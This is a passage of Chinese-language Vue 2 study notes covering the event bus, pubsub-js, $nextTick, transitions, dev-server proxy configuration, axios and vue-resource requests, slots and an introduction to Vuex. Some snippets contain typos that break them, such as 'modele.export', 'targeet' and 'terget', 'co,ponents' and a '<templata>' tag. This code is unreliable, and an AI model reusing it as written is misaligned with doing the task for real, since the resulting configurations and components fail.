      this.$bus.$on("checkTodo", this.checkTodo);
      this.$bus.$on("deleteTodo", this.deleteTodo);
    },
    beforeDestroy() {
      this.$bus.$off("checkTodo");
      this.$bus.$off("deleteTodo");
    },
  };
</script>
~~~

`src/components/MyItem.vue`

~~~vue
<template>
<li>
  <label>
    <input type="checkbox" :checked="todoObj.done" @change="handleCheck(todoObj.id)"/>
    <span>{{ todoObj.title }}</span>
  </label>
  <button class="btn btn-danger" @click="handleDelete(todoObj.id)">删除</button>
  </li>
</template>

<script>
  export default {
    name: "MyItem",
    data() {
      return {};
    },
    props: ["todoObj"], // 声明接受todoObj对象
    methods: {
      handleCheck(id) {
        this.$bus.$emit('checkTodo', id)
      },
      handleDelete(id) {
        if (confirm('确定删除吗？')) {
          this.$bus.$emit('deleteTodo', id)
        }
      }
    },
  };
</script>
~~~

## 消息的发布与订阅

消息发布与订阅(pubsub)   消息订阅与发布是一种组件间通信的方式，适用于任意组件间通信

### 使用步骤

1. 安装pubsub `npm i pubsub-js`

2. 引入`import pubsub from 'pubsub-js'`

3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

   ~~~js
   export default{
     methods：{
     	demo(msgName,data){...}
   	},
     mounted(){
       this.pid=pubsub.subscribe('xxx',this.demo)
     }
   }
   ~~~

   

4. 提供数据`pubsub.publish('xxx',data)`

5. 最好在beforeDestroy钩子中，使用`pubsub.unsubscribe(pid)`取消订阅

`src/components/School.vue`

~~~vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'

	export default {
		name: 'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		methods: {
			demo(msgName, data) {
				console.log('我是School组件，收到了数据：',msgName, data)
			}
		},
		mounted() {
			this.pubId = pubsub.subscribe('demo', this.demo) // 订阅消息
		},
		beforeDestroy() {
			pubsub.unsubscribe(this.pubId) // 取消订阅
		}
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
~~~

`src/components/Student.vue`

~~~vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">把学生名给School组件</button>
  </div>
</template>

<script>
  import pubsub from 'pubsub-js'

  export default {
    name:'Student',
    data() {
      return {
        name:'JOJO',
        sex:'男',
      }
    },
    methods: {
      sendStudentName(){
        pubsub.publish('demo', this.name) // 发布消息
      }
    }
  }
</script>

<style scoped>
  .student{
    background-color: pink;
    padding: 5px;
    margin-top: 30px;
  }
</style>
~~~

### 使用消息的订阅与发布优化Todo-List

`src/App.vue`

~~~vue
<template>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
      <MyHeader @addTodo="addTodo"/>
      <MyList :todos="todos"/>
      <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
  	</div>
  </div>
</div>
</template>

<script>
  import pubsub from 'pubsub-js'	// 习惯第三方库写上面
  import MyHeader from './components/MyHeader.vue'
  import MyList from './components/MyList.vue'
  import MyFooter from './components/MyFooter.vue'


  export default {
    name:'App',
    components: { MyHeader,MyList,MyFooter },
    data() {
      return {
        todos:JSON.parse(localStorage.getItem('todos')) || []
      }
    },
    methods:{
      //添加一个todo
      addTodo(todoObj){
        this.todos.unshift(todoObj)
      },
      //勾选or取消勾选一个todo
      checkTodo(_,id){
        this.todos.forEach((todo)=>{
          if(todo.id === id) todo.done = !todo.done
        })
      },
      //删除一个todo
      deleteTodo(id){
        this.todos = this.todos.filter(todo => todo.id !== id)
      },
      //全选or取消勾选
      checkAllTodo(done){
        this.todos.forEach(todo => todo.done = done)
      },
      //删除已完成的todo
      clearAllTodo(){
        this.todos = this.todos.filter(todo => !todo.done)
      }
    },
    watch:{
      todos:{
        deep:true,
        handler(value){
          localStorage.setItem('todos',JSON.stringify(value))
        }
      }
    },
    mounted(){
      this.pubId = pubsub.subscribe('checkTodo',this.checkTodo)	// 两种对比
      this.$bus.$on('deleteTodo',this.deleteTodo)
    },
    beforeDestroy(){
      pubsub.unsubscribe(this.pubId)
      this.$bus.$off('deleteTodo')
    }
  }
</script>

<style>
  body {
    background: #fff;
  }

  .btn {
    display: inline-block;
    padding: 4px 12px;
    margin-bottom: 0;
    font-size: 14px;
    line-height: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;
  }

  .btn-danger {
    color: #fff;
    background-color: #da4f49;
    border: 1px solid #bd362f;
  }

  .btn-danger:hover {
    color: #fff;
    background-color: #bd362f;
  }

  .btn:focus {
    outline: none;
  }

  .todo-container {
    width: 600px;
    margin: 0 auto;
  }
  .todo-container .todo-wrap {
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
</style>
~~~

`src/components/myItem.vue`

~~~vue
<template>
    <li>
        <label>
            <input type="checkbox" :checked="todo.done" @click="handleCheck(todo.id)"/>
            <span>{{todo.title}}</span>
        </label>
        <button class="btn btn-danger" @click="handleDelete(todo.id,todo.title)">删除</button>
    </li>
</template>

<script>
    import pubsub from 'pubsub-js'
    export default {
        name:'MyItem',
        props:['todo'],
        methods:{
            handleCheck(id){                    
                pubsub.publish('checkTodo',id)
            },
            handleDelete(id,title){
                if(confirm("确定删除任务："+title+"吗？")){
                    this.$bus.$emit('deleteTodo',id)
                }
            }
        }
    }
</script>

<style scoped>
    li {
        list-style: none;
        height: 36px;
        line-height: 36px;
        padding: 0 5px;
        border-bottom: 1px solid #ddd;
    }

    li label {
        float: left;
        cursor: pointer;
    }

    li label li input {
        vertical-align: middle;
        margin-right: 6px;
        position: relative;
        top: -1px;
    }

    li button {
        float: right;
        display: none;
        margin-top: 3px;
    }

    li:before {
        content: initial;
    }

    li:last-child {
        border-bottom: none;
    }

    li:hover {
        background-color: #eee;
    }

    li:hover button{
        display: block;
    }
</style>
~~~

# Vue CLI $nextTick 过渡与动画

## $nextTick

### 这是一个生命周期钩子

`this.$nextTick(回调)`在下一次==DOM==更新结束后执行其指定的回调

什么时候用：当改变数据后，要基于更新后的==DOM==进行某些操作时，要在**==nextTick==**所指定的回调函数中执行

使用$nextTick优化Todo-List

`src/component/MyItem.vue`

~~~Vue
<template>
  <li>
    <label>
      <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
      <span v-show="!todo.isEdit">{{ todo.title }}</span>
      <input type="text" v-show="todo.isEdit" :value="todo.title"
        @blur="handleBlur(todo, $event)" ref="inputTitle"/>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
    <button v-show="!todo.isEdit" class="btn btn-edit" @click="handleEdit(todo)">
      编辑
    </button>
  </li>
</template>

<script>
export default {
  name: "MyItem",
  
  props: ["todo"],	// 声明接收todo
  methods: {
    handleCheck(id) {		// 勾选or取消勾选
      // 通知App组件将对应的todo对象的done值取反
      // this.checkTodo(id)
      this.$bus.$emit("checkTodo", id);
    },
    handleDelete(id) {	// 删除
      if (confirm("确定删除吗？")) {
        // 通知App组件将对应的todo对象删除
        // this.deleteTodo(id)
        this.$bus.$emit('deleteTodo',id)
      }
    },
    handleEdit(todo) {	// 编辑
      if (todo.hasOwnProperty("isEdit")) {
        todo.isEdit = true;
      } else {
        this.$set(todo, "isEdit", true);
      }
      this.$nextTick(function () {
        this.$refs.inputTitle.focus();
      });
    },
    handleBlur(todo, e) {	// 失去焦点回调（真正执行修改逻辑）
      todo.isEdit = false;
      if (!e.target.value.trim()) return alert("输入不能为空！");
      this.$bus.$emit("updateTodo", todo.id, e.target.value);
    },
  },
};
</script>
~~~

![image](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image.png)

## 过渡与动画

==Vue==封装的过渡与动画：在插入、更新或者移动==DOM==元素在时，在适合的时候给元素添加样式类名!

![添加样式类名](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//添加样式类名.png)

### 写法：

1. ​	准备好样式

   - 元素进入的样式
     - v-enter  进入的起点
     - v-enter-active  进入过程中
     - v-enter-to   进入的终点

   - 元素离开的样式
     - v-leave   离开的起点
     - v-leave-active   离开的过程中
     - v-leave-to   离开的终点
2. 使用==<font color="red"><transition></font>==包裹要过度的元素，并配置==<font color="red">name</font>==属性，此时需要将上面样式名的==V==换为==name==
3. 要让页面也开始就显示动画，需要添加==<font color='red'>appear</font>==

~~~Vue
<transition name="hello" appear>
  <h1 v-show="isShow">你好啊！</h1>
</transition>

<style>
  .hello-enter-active{
    animation: hello 0.5s linear;
  }

  .hello-leave-active{
    animation: hello 0.5s linear reverse;
  }

  @keyframes hello {
    from{
      transform: translateX(-100%);
    }
    to{
      transform: translateX(0px);
    }
  }
</style>
~~~

4. 备注：若多个元素需要过渡，则需要==<font color='red'><transition-group></font>==，且每个元素都要指定==<font color='red'>key</font>==值

~~~vue
<transition-group name="hello" appear>
  <h1 v-show="!isShow" key="1">你好啊！</h1>
  <h1 v-show="isShow" key="2">尚硅谷！</h1>
</transition-group>
~~~

5. 第三方动画库==Animate.css==

~~~vue
<transition-group appear
          name="animate__animated animate__bounce"
          enter-active-class="animate__swing"
          leave-active-class="animate__backOutUp">
  <h1 v-show="!isShow" key="1">你好啊！</h1>
  <h1 v-show="isShow" key="2">尚硅谷！</h1>
</transition-group>
~~~

`src/App.vue`

~~~vue

<template>
	<div>
		<Test/>
		<Test2/>
		<Test3/>
	</div>
</template>

<script>
	import Test from './components/Test'
	import Test2 from './components/Test2'
	import Test3 from './components/Test3'

	export default {
		name:'App',
		components:{Test,Test2,Test3},
	}
</script>
~~~

`src/components/test.vue`

~~~vue

<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition name="hello" appear>
      <h1 v-show="isShow">你好啊！</h1>
    </transition>
  </div>
</template>

<script>
  export default {
    name: 'Test',
    data() {return {isShow:true}},
  }
</script>

<style scoped>
  h1{background-color: orange;}

  .hello-enter-active{
    animation: atguigu 0.5s linear;
  }

  .hello-leave-active{
    animation: atguigu 0.5s linear reverse;
  }

  @keyframes atguigu {
    from{transform: translateX(-100%);}
    to{transform: translateX(0px);}
  }
</style>
~~~

`src/components/test2`

~~~vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group name="hello" appear>
      <h1 v-show="!isShow" key="1">你好啊！</h1>
      <h1 v-show="isShow" key="2">尚硅谷！</h1>
    </transition-group>
  </div>
</template>

<script>
  export default {
    name:'Test',
    data() {return {isShow:true}},
  }
</script>

<style scoped>
  h1 {
    background-color: orange;
    /* transition: 0.5s linear; */
  }
  /* 进入的起点、离开的终点 */
  .hello-enter,.hello-leave-to {
    transform: translateX(-100%);
  }
  .hello-enter-active,.hello-leave-active{
    transition: 0.5s linear;
  }
  /* 进入的终点、离开的起点 */
  .hello-enter-to,.hello-leave {
    transform: translateX(0);
  }
</style>
~~~

![样式](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//样式.png)

`src/components/test3`

~~~vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group appear
                      name="animate__animated animate__bounce"
                      enter-active-class="animate__swing"
                      leave-active-class="animate__backOutUp">
      <h1 v-show="!isShow" key="1">你好啊！</h1>
      <h1 v-show="isShow" key="2">尚硅谷！</h1>
    </transition-group>
  </div>
</template>

<script>
  import "animate.css"
  
  export default {
    name: "Test",
    data() {return {isShow: true,}},
  };
</script>

<style scoped>
  h1 {background-color: orange;}
</style>
~~~

**使用动画优化 Todo-List**

`src/components/MyList.vue`

~~~vue
<template>
  <ul class="todo-main">
    <transition-group name="todo" appear>
      <MyItem v-for="todoObj of todoList" :key="todoObj.id" :todoObj="todoObj"/>
    </transition-group>
  </ul>
</template>

<script>
  import MyItem from "./MyItem.vue";

  export default {
    name: "MyList",
    components: { MyItem },
    props: ["todoList"],
  };
</script>

<style scoped>
  /*main*/
  .todo-main {margin-left: 0px;border: 1px solid #ddd;border-radius: 2px;padding: 0px;}
  .todo-empty {height: 40px;line-height: 40px;border: 1px solid #ddd;border-radius: 2px;
    padding-left: 5px;margin-top: 10px;}

  .todo-enter-active {
    animation: atguigu 0.5s linear;
  }

  .todo-leave-active {
    animation: atguigu 0.5s linear reverse;
  }

  @keyframes atguigu {
    from {
      transform: translateX(100%);
    }
    to {
      transform: translateX(0px);
    }
  }
</style>
~~~

# Vue中的Ajax配置代理 slot插槽

## Vue脚手架配置

本案例需要下载==axios==库==<font color='red'>npm install axios</font>==

**配置参考文档 Vie-Cli devServer.proxy**

==Vue.config.js==是一个可选的配置文件，如果像中的(和==package.json==同级别的)根目录中存在这个文件，那么它会被==@Vue/cli-serveice==自动加载。你也可以使用==package.json==中的==vue==字段，但是注意这种写法需要你严格遵照JSON的格式来写。

#### 方式一

​	在==Vue.config.js==中添加如下配置

~~~js
modele.export = {
  devserver:{
    proxy:"http://localhost:5000"
  }
}
~~~

说明：

1. 优点：配置简单，请求资源是直接发给前端（8000）即可
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，才会将请求转发给服务器（优先匹配前端资源）

方式二：

​	编写==Vue.config.js==配置具体代理规则

~~~js
module.exports= {
  devServer:{
    proxy:{
      '/api':{															// 匹配所有以'api1' 开头的请求路径
        targeet:"http://localhost:5000",			// 代理目标的基础路径
        pathRewrite:{'^/api1':''},					 // 代理王后端服务器的请求去掉'/api1'前缀		
        ws:true,													 //WebSocket
        changeOrigin:true,
      },
      '/api2':{
      target:'http://localhost:5001',
      pathRewrite:{'^/api2': ''},
    	changeOrigin:true
    }
    }
  }
}


/*
		changeOrigin 设置为true时，服务器收到的请求头中的host为：localhost:5000
		changeOrigin 设置为false时，服务器收到的请求头为：localhost：8080
		changeOrigin默认值为true
		是否跨域
*/
~~~

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理
2. 缺点：配置略微繁琐，请求资源时必须加载前缀

==Vue.config.js==

~~~js
module.exports = {
  pages:{
    index:{
      entry:'src/main.js'
    }
  },
  lintOnSave:false,
  //开启代理服务器（方式一）
  // devServer:{
  //     proxy:'http://localhost:5000'
	//}
  
  //开启代理服务器（方式二）
  devServer:{
    proxy:{
      'api1':{
        terget:'http://localhost:5000',
        pathRewrite:{'^/api1':''},
        //ws:true //用于支持webscoket，默认值为true
        //changeOrigin：true  //用于控制请求头中的host值，默认值为true
      },
      '/api2':{
        target:'http://localhost:5001',
        pathRewrite:{'^/api2':''},
      }
    }
  }
}
~~~

`src/App.vue`

~~~VUE
<template>
	<div>
  	<button @click="getStudents">获取学生信息</button>
    <button @click="getCars">获取汽车信息</button>
  </div>
</template>
<script>
	import axios from 'axios'
  export default {
    name:'App',
    methods:{
      getStudents(){
        axios.get('http://localhost:8080/students').then(
        res=>{console.log('请求成功了',res.data)},
        err=>{console.log('请求失败了',err.message)}
        )
      },
      getCars(){
        axios.get('http://localhost:8080/demo/cars').then(
        res=>{console.log('请求成功了',res.data)},
        err=>{console.log('请求失败了',err.message)}
        )
      }
    }
  }
</script>
~~~



![proxy](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//proxy.png)

## GitHub用户搜索案例

`public/index.html`

~~~html
<!DOCTYPE html>
<html lang="">
    <head>
        <meta charset="UTF-8">
        <!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <!-- 开启移动端的理想端口 -->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- 配置页签图标 -->
        <link rel="icon" href="<%= BASE_URL %>favicon.ico">
      
        <!-- 引入bootstrap样式 -->
        <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
      
        <!-- 配置网页标题 -->
        <title><%= htmlWebpackPlugin.options.title %></title>
    </head>
    <body>
        <!-- 容器 -->
        <div id="app"></div>
    </body>
</html>
~~~

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
    el:"#app",
    render: h => h(App),
    beforeCreate(){
        Vue.prototype.$bus = this
    }
})
~~~

`src/App.vue`

~~~vue
<template>
  <div class="container">
    <Search/>
    <List/>
  </div>
</template>

<script>
  import Search from './components/Search.vue'
  import List from './components/List.vue'

  export default {
    name:'App',
    components:{ Search, List },
  }
</script>
~~~

`src/components/Search.vue`

~~~vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input type="text" placeholder="enter the name you search" v-model="keyWord"/>&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>

<script>
import axios from "axios";
export default {
  name: "Search",
  data() {
    return {
      keyWord: "",
    };
  },
  methods: {
    searchUsers() {
      //请求前更新List的数据
      this.$bus.$emit("updateListData", {
        isLoading: true,
        errMsg: "",
        users: [],
        isFirst: false,
      });
      axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
        (response) => {
          console.log("请求成功了");
          this.$bus.$emit("updateListData", {	//请求成功后更新List的数据
            isLoading: false,
            errMsg: "",
            users: response.data.items,
          });
        },
        (error) => {
          this.$bus.$emit("updateListData", {	//请求后更新List的数据
            isLoading: false,
            errMsg: error.message,
            users: [],
          });
        }
      );
    },
  },
};
</script>
~~~

`src/components/List.vue`

~~~vue
<template>
  <div class="row">
    <!-- 展示用户列表 -->
    <div v-show="info.users.length" class="card" 
         v-for="user in info.users" :key="user.login">
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style="width: 100px" />
      </a>
      <p class="card-text">{{ user.login }}</p>
    </div>
    <!-- 展示欢迎词 -->
    <h1 v-show="info.isFirst">欢迎使用！</h1>
    <!-- 展示加载中 -->
    <h1 v-show="info.isLoading">加载中....</h1>
    <!-- 展示错误信息 -->
    <h1 v-show="info.errMsg">{{ info.errMsg }}</h1>
  </div>
</template>

<script>
export default {
  name: "List",
  data() {
    return {
      info: {
        isFirst: true,
        isLoading: false,
        errMsg: "",
        users: [],
      },
    };
  },
  mounted() {
    this.$bus.$on("updateListData", (dataObj) => {
      this.info = { ...this.info, ...dataObj };
    });
  },
};
</script>

<style scoped>
.album {min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;padding-bottom: 3rem;background-color: #f7f7f7;}
.card {float: left;width: 33.333%;padding: 0.75rem;margin-bottom: 2rem;
  border: 1px solid #efefef;text-align: center;}
.card > img {margin-bottom: 0.75rem;border-radius: 100px;}
.card-text {font-size: 85%;}
</style>
~~~

![githubSeatch](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//githubSeatch.png)

## ~~4.3 Vue resource~~

==Vue==常用的两个==Ajax==库

1. ==axios==：通用的Ajax请求库，官方推荐，效率高
2. ==Vue-resource==：vue插件库，vue1.x使用广泛，官方已不再维护

下载==vue-resource==库==npm i vue-resource==

`src/main.js`

~~~JS
import Vue from 'vue'
import App from './App.vue'
import vueResource from 'vue-resource'

Vue.config.productionTip = false

Vue.use(vueResource)

new Vue({
    el:"#app",
    render: h => h(App),
    beforeCreate(){
        Vue.prototype.$bus = this
    }
})
~~~

`src/App.vue`

~~~VUE

<template>
	<div class="container">
		<Search/>
		<List/>
	</div>
</template>

<script>
	import Search from './components/Search.vue'
	import List from './components/List.vue'

    export default {
        name:'App',
		components:{ Search, List },
	}
</script>
~~~

`src/components/Search.vue`

~~~VUE

<template>
    <section class="jumbotron">
		<h3 class="jumbotron-heading">Search Github Users</h3>
		<div>
      <input type="text" placeholder="enter the name you search" v-model="keyWord"/>&nbsp;
      <button @click="getUsers">Search</button>
		</div>
    </section>
</template>

<script>
  export default {
    name:'Search',
    data() {
      return {
        keyWord:''
      }
    },
    methods: {
      getUsers(){
        //请求前更新List的数据
        this.$bus.$emit('updateListData',
                        {isLoading:true,errMsg:'',users:[],isFirst:false})
        this.$http.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
          response => {
            console.log('请求成功了')
            //请求成功后更新List的数据
            this.$bus.$emit('updateListData',
                            {isLoading:false,errMsg:'',users:response.data.items})
          },
          error => {
            //请求后更新List的数据
            this.$bus.$emit('updateListData',
                            {isLoading:false,errMsg:error.message,users:[]})
          }
        )
      }
    }
  }
</script>
~~~

`src/components/List.vue`

~~~	vue
<template>
    <div class="row">
        <!-- 展示用户列表 -->
        <div class="card" v-show="info.users.length" v-for="user in info.users" :key="user.id">
            <a :href="user.html_url" target="_blank">
                <img :src="user.avatar_url" style='width: 100px'/>
            </a>
            <h4 class="card-title">{{user.login}}</h4>
        </div>
        <!-- 展示欢迎词 -->
        <h1 v-show="info.isFirst">欢迎使用！</h1>
        <!-- 展示加载中 -->
        <h1 v-show="info.isLoading">加载中...</h1>
        <!-- 展示错误信息 -->
        <h1 v-show="info.errMsg">{{errMsg}}</h1>
    </div>
</template>

<script>
    export default {
        name:'List',
        data() {
            return {
                info:{
                    isFirst:true,
                    isLoading:false,
                    errMsg:'',
                    users:[]
                }
            }
        },
        mounted(){
            this.$bus.$on('updateListData',(dataObj)=>{
                this.info = {...this.info,...dataObj}
            })
        },
        beforeDestroy(){
            this.$bus.$off('updateListData')
        }
    }
</script>
~~~

## slot插槽

==<font color='red'><slot></font>==插槽：让父组件可以向子组件指定位置插入==html==结构，也是一种组件间通信的方式(通信：传送的是html结构)

数据在子组件中，父组件通过scope接收数据

​				适用于  **父组件**=>**子组件**

1. ​	分类：默认插槽、具名插槽、作用域插槽

2. 使用方式：

   - 默认插槽

   ~~~vue
   父组件中：
   <Category>
   	<div>HTML结构1</div>
   </Category>
   子组件中：Category
   <template>
   	<div>
       <!-- 定义插槽 -->
   		<slot>插槽默认内容...</slot>
     </div>
   </template>
   ~~~

   - 具名插槽

     父组件指明放入子组件的哪个插槽==<font color='red'>slor=“</font>footer<font color='red'>”</font>==,如果是==template==可以写成==v-slot:footer==

     ~~~vue
     父组件中：
     <Category>
     	<template slot="center">
       	<div>html结构1</div>
       </template>
       <template v-slot:footer>
       	<div>html结构2</div>
       </template>
     </Category>
     
     子组件中：
     <template>
     	<div>
         <!-- 定义插槽-->
         <slot name="center">插槽默认内容....</slot>
         <slot name="footer">插槽默认内容....</slot>
       </div>
     </template>
     ~~~

   - 作用域插槽

     ==<font color='red'>scope</font>==用于父组件往子组件插槽放的==html==结构接收子组件的数据

     理解：<font color='red'>数据在组件的自身，但数据生成的结构需要组件的使用者来决定</font>

     (==games==数据在==Category==组件中，但使用数据所遍历出来的结构由==App==组件决定)

     ~~~vue
     父组件中：
     <Category>
     	<template scope="scopeDarta">
       	<!-- 生成的是ul列表 -->
     		<ul>
           <li v-for="g in scopeData.games" :key="g">{{g}}</li>
         </ul>
       </template>
     </Category>
     
     <Category>
     	<template slot-scope="scopeData">
       	<!-- 生成的是h4标题 -->
     		<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
       </template>
     </Category>
     
     
     子组件中：
     <template>
     	<div>
         <slot :game="games"></slot>
       </div>
     </template>
     
     <script>
     	export default{
         name:'Category',
         props:['title'],
         //数据在子组件自身
         data(){
           return {
             games:['红色警戒','穿越火线','劲舞团','超级玛丽']
           } 
         }
       }
     </script>
     ~~~

     **注意：**关于**样式**，既可以写在父组件中，解析后放入子组件插槽中，也可以放在子组件中，传给子组件再解析

     

## 默认插槽

`src/App.vue`

~~~vue
<template>
	<div class="container">
    <Category title="美食">
  		<img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg"/>
  	</Category>
    
    <Category>
  		<ul>
        <li v-for="(g,index) in games" :key="index">{{g}}</li>
			</ul>
  	</Category>
    
    <Category>
  		<video contorols src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
  	</Category>
  </div>
</template>
<script>
	import Category from './components/Category'
  export default{
    name:'App',
    components:{Category},
    data(){
      return {
        foods:['火锅','烧烤','小龙虾','牛排'],
        games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
        files:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
      }
    }
  }
</script>

<style scoped>.container{display: flex;justify-content: space-around;}</style>
~~~

`src/components/Category.vue`

~~~vue
<templata>
	<div class="category">
    <h3>{{title}}分类</h3>
    <!-- 定义一个插槽（挖个坑，等着组建的使用者进行填充） -->
    <slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
  </div>
</templata>

<script>
	export default{
    name:'Category',
    props:['title']
  }
</script>


<style scoped>
	.category {background-color: skyblue;width: 200px;height: 300px;}
	h3 {text-align: center;background-color: orange;}
	video {width: 100%;}
	img {width: 100%;}
</style>
~~~

![20210811215648](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//20210811215648.png)

## 具名插槽

`src/App.vue`

~~~vue
<template>
	<div class="container">
		<Category title="美食" >
			<img slot="conter" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
			<a slot="footer" href="http://www.atguigu.com">更多美食</a>
		</Category>

		<Category title="游戏" >
			<ul slot="center">
				<li v-for="(g,index) in games" :key="index">{{g}}</li>
			</ul>
			<div class="foot" slot="footer">
				<a href="http://www.atguigu.com">单机游戏</a>
				<a href="http://www.atguigu.com">网络游戏</a>
			</div>
		</Category>

		<Category title="电影">
			<video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
			<template v-slot:footer>
				<div class="foot">
					<a href="http://www.atguigu.com">经典</a>
					<a href="http://www.atguigu.com">热门</a>
					<a href="http://www.atguigu.com">推荐</a>
				</div>
				<h4>欢迎前来观影</h4>
			</template>
		</Category>
	</div>
</template>

<script>
	import Category from './components/Category'
	export default {
		name:'App',
		components:{Category},
		data() {
			return {
				foods:['火锅','烧烤','小龙虾','牛排'],
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
				films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
			}
		},
	}
</script>

<style scoped>
	.container,.foot{display: flex;justify-content: space-around;}
	h4{text-align: center;}
</style>

~~~

`src/components/Category.vue`

~~~vue

<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
		<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
		<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
	</div>
</template>

<script>
	export default {
		name:'Category',
		props:['title']
	}
</script>

<style scoped>
	.category{background-color: skyblue;width: 200px;height: 300px;}
	h3{text-align: center;background-color: orange;}
	video{width: 100%;}
	img{width: 100%;}
</style>
~~~

![20210811221628](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//20210811221628.png)

## 作用域插槽

`src/App.vue`

~~~vue
<template>
	<div class="container">

		<Category title="游戏">
			<template scope="atguigu">
				<ul>
					<li v-for="(g,index) in atguigu.games" :key="index">{{g}}</li>
				</ul>
			</template>
		</Category>

		<Category title="游戏">
			<template scope="{games}">
				<ol>
					<li style="color:red" v-for="(g,index) in games" :key="index">{{g}}</li>
				</ol>
			</template>
		</Category>

		<Category title="游戏">
			<template slot-scope="{games}">
				<h4 v-for="(g,index) in games" :key="index">{{g}}</h4>
			</template>
		</Category>
	</div>
</template>

<script>
	import Category from './components/Category'
	export default {
		name:'App',
		components:{ Category },
	}
</script>

<style scoped>
	.container,.foot{display: flex;justify-content: space-around;}
	h4{text-align: center;}
</style>
~~~

`src/components/Category.vue`

~~~vue

<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<slot :games="games" msg="hello">我是默认的一些内容</slot>
	</div>
</template>

<script>
	export default {
		name:'Category',
		props:['title'],
		data() {
			return {
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
			}
		},
	}
</script>

<style scoped>
	.category{background-color: skyblue;width: 200px;height: 300px;}
	h3{text-align: center;background-color: orange;}
	video{width: 100%;}
  img{width: 100%;}
</style>
~~~

![202307171821](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//202307171821.png)

> `v-slot:name`和slot=“name”  用于指明具名插槽的name
>
> `scope=“数据”`和slot-scope=“数据”  用于指明父组件中用到的子组件中的数据

# Vuex

## 理解什么是Vuex

### Vuex是什么？

1. 概念：专门在==Vue==中实现集中式状态（数据）管理的一个==Vue==插件，对==Vue==应用中多个组件的共享状态（数据）进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信
2. [Vuex Github地址](https://github.com/vuejs/vuex   "点击打开Vuex项目")

![多组件共享数据-全局事件总线实现](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//多组件共享数据-全局事件总线实现.png)

![多组件共享数据-vuex实现](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//多组件共享数据-vuex实现.png)

### 什么时候使用Vuex

1. 多个组件依赖同一状态（即多个组件要用同个数据）
2. 来自不同组件的行为需要改变同一状态（即多个组件都要通过事件改变一个数据的值）

### Vuex的工作原理图

![Vuex工作原理图](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//Vuex工作原理图.png)

$store.dispatch(’事件名‘,数据)调用Actions中的事件，然后在actions中

$store.commit(‘事件名’,数据)调用Mutations中的事件，然后就去修改State中的数据了

>`谨记`Actions不是不必要的操作，它用于异步操作，当不需要异步操作时，可以直接.commit调用mutations中的事件，掠过actions
>
>Actions中的事件名为全小写，mutations中的事件名为全大写，区分来，方便区分调用！

## 求和案例

![求和案例示例图1](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//求和案例示例图1.png)

`src/App.vue`

~~~vue
<template>
	<div>
    <Count/>
  </div>
</template>
<script>
	import Count from './components/Count.vue'
  export default {
    name:'App',
    co,ponents:{Count}
  }
</script>
~~~

`src/components/Count.vue`

~~~vue
<template>
	<div>
